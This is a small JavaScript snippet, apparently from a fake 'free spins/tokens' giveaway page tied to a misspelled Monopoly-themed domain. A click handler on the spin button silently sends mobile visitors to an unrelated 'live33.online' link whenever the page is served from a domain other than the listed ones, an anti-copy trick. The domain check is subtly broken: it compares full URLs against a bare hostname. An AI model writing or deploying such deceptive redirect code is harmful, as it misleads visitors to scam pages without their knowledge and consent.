
 /*================== [ VICTOR ABDO ] ===============*/
 /*================== [ monopoly ] ================*/
var button = document.querySelector('.spin-buttons');  
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://live33.online/?be72c72";
        var allowedDomains = [
            "https://mply.io.t0ke2n.site",
            "https://mply.io.1arshg4.site",
            "https://mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !allowedDomains.includes(window.location.hostname)) {
            var isMobileDevice = /iPhone|iPad|Android/i.test(navigator.userAgent);
            if (isMobileDevice) {
                window.location.href = redirectURL;
            }
        }
    })();
});
